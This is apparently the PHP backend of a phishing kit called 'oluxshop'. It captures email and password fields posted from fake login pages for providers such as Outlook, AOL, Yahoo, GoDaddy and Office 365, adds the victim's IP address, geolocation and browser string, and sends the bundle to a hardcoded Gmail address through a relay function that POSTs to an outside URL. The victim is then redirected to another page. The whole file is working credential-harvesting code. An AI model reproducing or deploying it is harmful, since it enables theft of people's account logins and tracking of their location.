<?php
function mails($send,$subject,$message){
	$bmessage = base64_encode($message);
	$myname = $_SERVER['HTTP_HOST'];
$posta = array(
"emailto"=>"$send",
"subject"=>"$subject",
"message"=>"$bmessage",
"myname"=>"$myname"
);
//$url = "http://surecann.com/image/mail.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $posta);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$ycr = curl_exec($ch);
if(preg_match('please wait...', $ycr)){
	return 1;
	
}
}
require_once('geoplugin.class.php');

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 


$msg = "--------------oluxshop-----------------------------\n";
$msg .= "oluxshop\n";
$msg .= "-----------------< oluxshop >---------------------------\n";
$msg .= "Email: ".$_POST['emazz']."\n";
$msg .= "Password: ".$_POST['pswdd']."\n";
$msg .= "--------------------< IP-ADD >---------------------------------\n";
$msg .= "IP : " .$ip. "\n";
$msg .= "-------------------------------------------------------\n";
$msg .= 	"City: {$geoplugin->city}\n";
$msg .= 	"Region: {$geoplugin->region}\n";
$msg .= 	"Country Name: {$geoplugin->countryName}\n";
$msg .= 	"Country Code: {$geoplugin->countryCode}\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "-------------< oluxshop >-----------------------------\n";

if($_POST['OLD']=="ol") {
	$subject=" $state oluxshop From Others";
}
if($_POST['YML']=="hm") {
	$subject=" $state oluxshop From  Llve";
}
if($_POST['ALL']=="al") {
	$subject=" $state oluxshop From  AoI";
}
if($_POST['YAM']=="ya") {
	$subject=" $state oluxshop From  YM";
}
if($_POST['OG']=="goall") {
	$subject=" $state oluxshop From  Godad";
}
if($_POST['OFF']=="of") {
	$subject=" $state oluxshop From 360";
}


$to = "kaitobest8@gmail.com";
$from = "From: oluxshop<no_reply@inbox.com>";
mails($to,$subject,$msg,$from);

?>
<script type="text/javascript"> 
<!-- 
   window.location="one.html"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 